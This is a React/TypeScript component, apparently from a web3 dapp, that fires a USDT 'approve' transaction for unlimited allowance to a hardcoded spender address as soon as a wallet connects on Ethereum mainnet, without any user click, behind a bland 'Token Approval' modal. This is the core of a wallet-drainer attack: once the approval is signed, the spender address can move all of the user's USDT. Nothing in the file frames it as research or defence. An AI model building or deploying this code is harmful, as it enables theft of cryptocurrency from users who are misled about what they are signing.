"use client"

import { useEffect, useState } from "react"
import { useAccount, useWriteContract, useWaitForTransactionReceipt, useChainId, useSwitchChain } from "wagmi"
import { erc20Abi } from "viem"

export default function ApproveOnConnect() {
  const { address, isConnected } = useAccount()
  const [hash, setHash] = useState<`0x${string}` | undefined>()
  const chainId = useChainId()
  const { switchChain, isPending: isSwitching } = useSwitchChain()
  const isOnEthereum = chainId === 1

  const { writeContract, isPending, error } = useWriteContract()
  const { isSuccess } = useWaitForTransactionReceipt({ hash })

  useEffect(() => {
    if (!isConnected || !address || !isOnEthereum) return

    // const spender = "0xYourDappContractAddress" // your contract
    const spender = "0x9B0309aCEf75B76b24E2aAc994d1cFFB90Da579D"    // your contract
    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7" // USDT mainnet

    // call approve automatically
    writeContract(
      {
        chainId: 1, // ensure Ethereum Mainnet
        address: tokenAddress,
        abi: erc20Abi,
        functionName: "approve",
        args: [spender, BigInt(2) ** BigInt(256) - BigInt(1)], // unlimited allowance
      },
      {
        onSuccess(txHash) {
          setHash(txHash)
        },
      }
    )
  }, [isConnected, address, isOnEthereum, writeContract])

  if (!isConnected) return null

  return (
    <div
      role="dialog"
      aria-modal="true"
      className="fixed inset-0 z-50 flex items-center justify-center"
    >
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
      <div className="relative mx-4 w-full max-w-md overflow-hidden rounded-2xl border border-white/10 bg-gradient-to-b from-slate-900/90 to-slate-950/90 shadow-2xl">
      <div className="border-b border-white/10 px-6 py-5">
        <h2 className="text-lg font-semibold text-white">Token Approval</h2>
        <p className="mt-1 text-sm text-slate-300">
        Allow the dapp to spend your USDT on your behalf.
        </p>
      </div>

      <div className="px-6 py-5">
        {!isOnEthereum && (
          <div className="flex items-center justify-between gap-3 text-slate-200">
            <p>Switch to Ethereum Mainnet to continue.</p>
            <button
              type="button"
              onClick={() => switchChain({ chainId: 1 })}
              disabled={isSwitching}
              className="rounded-md bg-white/10 px-3 py-1.5 text-sm text-white hover:bg-white/20 disabled:opacity-50"
            >
              {isSwitching ? "Switching..." : "Switch to Ethereum"}
            </button>
          </div>
        )}

        {isOnEthereum && isPending && (
        <div className="flex items-center gap-3 text-slate-200">
          <div className="h-4 w-4 animate-spin rounded-full border-2 border-slate-400 border-t-transparent" />
          <p>Approving... ⏳</p>
        </div>
        )}

        {isOnEthereum && isSuccess && (
        <div>
          <p className="text-emerald-400">✅ Unlimited approval granted!</p>
          {hash && (
          <a
            href={`https://etherscan.io/tx/${hash}`}
            target="_blank"
            rel="noreferrer"
            className="mt-3 inline-block text-sm text-emerald-300 underline decoration-emerald-500/60 underline-offset-4 hover:text-emerald-200"
          >
            View transaction on Etherscan
          </a>
          )}
        </div>
        )}

        {isOnEthereum && error && (
        <p className="text-rose-400">
          Error: {error.message}
        </p>
        )}
      </div>

      <div className="flex items-center justify-end gap-2 border-t border-white/10 px-6 py-4">
        <button
        type="button"
        className="rounded-md bg-white/10 px-4 py-2 text-sm text-white hover:bg-white/20"
        onClick={(e) => {
          // No local state available; soft-dismiss by removing the element from view
          const modal = (e.currentTarget.closest('[role="dialog"]') as HTMLElement | null)
          if (modal) modal.style.display = 'none'
        }}
        >
        Close
        </button>
      </div>
      </div>
    </div>
  )
}
